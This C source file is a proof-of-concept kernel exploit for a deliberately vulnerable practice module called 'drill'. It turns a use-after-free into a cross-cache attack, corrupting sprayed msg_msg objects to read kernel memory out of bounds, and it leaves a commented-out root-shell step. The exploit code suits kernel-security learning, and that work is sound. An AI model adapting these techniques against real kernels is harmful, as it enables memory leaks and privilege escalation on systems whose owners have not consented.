/*
 * Funny experiments with Linux kernel exploitation:
 * a basic use-after-free exploit writing data to the freed `drill_item_t` struct.
 *
 * Only basic methods. Just for fun.
 *
 * You may compile the Linux kernel with these options
 * (they don't break the implemented cross-cache attack):
 *   - CONFIG_SLAB_BUCKETS
 *   - CONFIG_RANDOM_KMALLOC_CACHES
 *
 * Currently, this PoC performs OOB reading of the kernel memory.
 * LPE is TODO.
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <stdbool.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/xattr.h>
#include <assert.h>
#include <sched.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include "drill.h"

#define STR_EXPAND(arg) #arg
#define STR(arg) STR_EXPAND(arg)

void do_cpu_pinning(void)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(0, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		exit(EXIT_FAILURE);
	}

	printf("[+] pinned to CPU #0\n");
}

void run_sh(void)
{
	pid_t pid = -1;
	char *args[] = {
		"/bin/sh",
		"-i",
		NULL
	};
	int status = 0;

	pid = fork();

	if (pid < 0) {
		perror("[-] fork");
		return;
	}

	if (pid == 0) {
		execve("/bin/sh", args, NULL); /* Should not return */
		perror("[-] execve");
		exit(EXIT_FAILURE);
	}

	if (wait(&status) < 0)
		perror("[-] wait");
}

int act(int fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	bytes = write(fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

/*
 * Cross-cache attack:
 *  - collect the needed info:
 *      /sys/kernel/slab/kmalloc-rnd-04-96/cpu_partial
 *        120
 *      /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
 *        42
 *  - pin the process to a single CPU
 *  - create new active slab, allocate objs_per_slab objects
 *  - allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list
 *  - create new active slab, allocate objs_per_slab objects
 *  - obtain dangling reference from use-after-free bug
 *  - create new active slab, allocate objs_per_slab objects
 *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
 *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
 *  - allocate (objs_per_slab * 2) target objects to create and fill new target slab
 *  - perform uaf write using the dangling reference
 *  - execute the exploit primitive via the overwritten target object
 */
#define OBJS_PER_SLAB 42
#define CPU_PARTIAL 120

#define MSG_NORM_SIZE	DRILL_ITEM_SIZE - 48
#define MSG_NORM_TYPE	5
#define MSG_OOB_SIZE	0x2000
#define BUF_OOB_SIZE	MSG_OOB_SIZE + 0x100
#define MSG_OOB_TYPE	0xc001

unsigned long *msgrcv_buf = NULL;
int msqid = -1;

struct {
	long mtype;
	char mtext[MSG_NORM_SIZE];
} msg_oob_r;

int prepare_msg_msg(void)
{
	int for_ftok_fd = -1;
	key_t key;

	msgrcv_buf = malloc(BUF_OOB_SIZE);
	if (msgrcv_buf == NULL) {
		perror("[-] malloc");
		return 1;
	}
	memset(msgrcv_buf, 0, BUF_OOB_SIZE);

	for_ftok_fd = open("forftok1", O_CREAT, S_IRUSR | S_IWUSR);
	if (for_ftok_fd < 0) {
		perror("[-] open for ftok");
		return 1;
	}
	close(for_ftok_fd);

	key = ftok("forftok1", 1);
	if (key == -1) {
		perror("[-] ftok");
		return 1;
	}

	msqid = msgget(key, IPC_CREAT | 0666);
	if (msqid == -1) {
		perror("[-] msgget");
		return 1;
	}

	printf("[+] created msqid %d\n", msqid);

	memset(msg_oob_r.mtext, 0x42, MSG_NORM_SIZE);
	msg_oob_r.mtype = MSG_NORM_TYPE;

	return 0;
}

int main(void)
{
	int ret = EXIT_FAILURE;
	int fd = -1;
	long i = 0;
	long current_n = 0;
	long reserved_from_n = 0;
	long uaf_n = 0;
	ssize_t bytes = 0;
	long uaf_msg_n = 0;

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

	ret = prepare_msg_msg();
	if (ret)
		goto end;

	fd = open("/proc/drill_act", O_WRONLY);
	if (fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	printf("[!] pin the process to a single CPU\n");
	do_cpu_pinning();

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
	reserved_from_n = current_n;

	printf("[!] allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] obtain dangling reference from use-after-free bug\n");
 	uaf_n = current_n - 1;
	printf("[+] done, uaf_n: %ld\n", uaf_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object\n");
	current_n--; /* point to the last allocated */
	current_n--; /* don't free the last allocated to keep this active slab */
	for (i = 0; i < OBJS_PER_SLAB * 2 - 1; i++) {
		if (act(fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	current_n -= i;
	assert(current_n < uaf_n); /* to be sure that uaf object is freed */
	printf("[+] done, current_n: %ld (next for freeing)\n", current_n);

	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i += OBJS_PER_SLAB) {
		if (act(fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	/* Now current_n should point to the last element in the reserved slabs */
	assert(reserved_from_n + i - 1 == current_n);
	printf("[+] done, now go spraying\n");

	printf("[!] allocate (objs_per_slab * 2) target objects to create and fill new target slab\n");
	for (i = 0; i < OBJS_PER_SLAB * 2; i++) {
		ret = msgsnd(msqid, &msg_oob_r, sizeof(msg_oob_r.mtext), 0);
		if (ret) {
			perror("[-] realloc msgsnd");
			goto end;
		}
	}
	printf("[+] msg_msg spraying is done\n");

	printf("[!] perform uaf write using the dangling reference\n");
	/*
	 * Overwrite msg_msg m_type:
	 *  - m_type in msg_msg is at the offset 16;
	 *  - DRILL_ACT_SAVE_VAL with 0 as 2nd argument also starts at the offset 16.
	 */
	ret = act(fd, DRILL_ACT_SAVE_VAL, uaf_n, STR(MSG_OOB_TYPE) " 0");
	if (ret == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_SAVE_VAL\n");

	/*
	 * Overwrite msg_msg size m_ts:
	 *  - m_ts in msg_msg is at the offset 24;
	 *  - DRILL_ACT_SAVE_VAL with 8 as 2nd argument also starts at the offset 24.
	 */
	ret = act(fd, DRILL_ACT_SAVE_VAL, uaf_n, STR(MSG_OOB_SIZE) " 8");
	if (ret == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_SAVE_VAL\n");

	printf("[!] execute the exploit primitive via the overwritten target object\n");
	for (i = 0; i < OBJS_PER_SLAB * 2; i++) {
		bytes = msgrcv(msqid, msgrcv_buf, MSG_OOB_SIZE, i, IPC_NOWAIT | MSG_COPY);
		if (bytes == -1) {
			perror("[-] msgrcv MSG_COPY");
			goto end;
		}

		if (bytes == sizeof(msg_oob_r.mtext)) {
			printf("    normal message: %zd bytes, type 0x%lx\n", bytes, msgrcv_buf[0]);
		} else {
			printf("[+] OOB READ: %zd bytes, type 0x%lx\n", bytes, msgrcv_buf[0]);
			uaf_msg_n = i;
			break;
		}
	}

	if (bytes == sizeof(msg_oob_r.mtext)) {
		printf("[-] cross-cache attack failed, good luck with debugging\n");
		goto end;
	}

	printf("[+] non-zero values from oob read dump (message %ld):\n", uaf_msg_n);
	for (i = 0; i < bytes / sizeof(unsigned long); i++) {
		if (msgrcv_buf[i])
			printf("  %ld: 0x%lx\n", i * sizeof(unsigned long), msgrcv_buf[i]);
	}

	/*
	if (getuid() == 0 && geteuid() == 0) {
		printf("[+] finish as: uid=0, euid=0, start sh...\n");
		run_sh();
		ret = EXIT_SUCCESS;
	} else {
		printf("[-] privesc\n");
	}
	*/

end:
	printf("[!] finishing this PoC exploit\n");

	for (i = 0; ; i++) {
		bytes = msgrcv(msqid, msgrcv_buf, MSG_OOB_SIZE, MSG_NORM_TYPE, IPC_NOWAIT);
		if (bytes == -1) {
			break;
		}
	}
	printf("  cleaned the message queue: received %ld normal messages\n", i);

	if (fd >= 0) {
		ret = close(fd);
		if (ret != 0)
			perror("[-] close fd");
		printf("  closed the drill_act fd\n");
	}

	return ret;
}
